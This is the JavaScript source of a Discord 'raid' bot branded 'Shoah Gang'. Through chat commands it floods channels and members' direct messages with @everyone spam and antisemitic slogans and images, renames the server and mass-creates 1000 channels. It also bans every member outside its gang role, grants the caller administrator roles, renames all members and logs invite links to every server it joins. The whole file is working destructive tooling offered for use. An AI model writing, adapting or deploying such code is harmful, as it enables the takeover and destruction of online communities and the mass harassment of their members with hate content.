const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 



bot.on('ready',() => {
  //invit link
  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
  });
}); 

bot.on('message', msg => {

  if (msg.content === '.ping') {
    msg.reply('pong !')
  }

  //#endregion

  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ 
    return;
  }
  
  


    
if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
"https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
"SHOAH GANG ON THE BEAT (: \n"+
"~ ~ ~ ~ ~ ~~ ~ \n"+    
"ROCKET MAN MA SALOPE \n"+
"~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('raid_by_shoah_gang', 'voice').catch(e => {});
        msg.guild.createChannel('raid_by_shoah_gang', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {

    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 500) clearInterval(interval);
      msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) {
        msg.member.addRole(role).catch(e => {});
        if (msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }

  if(msg.content === ".renameall"){
    if(msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      if(member.setNickname("SHOAH GANG ON THE DANCEFLOOR"));      
  })
  }
  if(msg.content === ".mp"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
        "https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
        "SHOAH GANG ON THE BEAT (: \n"+
        "~ ~ ~ ~ ~ ~~ ~ \n"+    
        "ROCKET MAN MA SALOPE \n"+
        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
      }, 450)

      }   
  })
  }

});

bot.login(process.env.BOT_TOKEN)
